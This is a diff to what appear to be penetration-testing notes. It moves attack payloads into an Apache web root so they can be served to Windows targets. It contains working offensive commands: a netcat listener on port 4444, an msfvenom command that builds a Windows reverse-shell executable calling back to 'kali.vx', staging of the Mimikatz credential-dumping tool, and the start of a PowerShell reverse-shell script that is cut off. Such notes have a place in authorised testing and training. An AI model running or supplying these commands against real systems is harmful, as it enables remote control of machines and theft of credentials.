@@ -16,7 +16,8 @@ nc -nlvp 4444
 ### Setup web server
 
 ```console
-sudo python3 -m http.server 80 &> /dev/null &
+systemctl start apache2
+systemctl status apache2
 ```
 
 ### Prepare files to web server root
@@ -24,18 +25,18 @@ sudo python3 -m http.server 80 &> /dev/null &
 #### Mimikatz:
 
 ```console
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 ```
 
 #### Windows reverse shell TCP:
 
 ```console
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o reverse.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
 ```
 
 #### PowerShell-based reverse shell script:
 
-`vi reverse.ps1` with below code:
+`vi /var/www/html/reverse.ps1` with below code:
 
 ```console
 $ADDRESS='kali.vx'
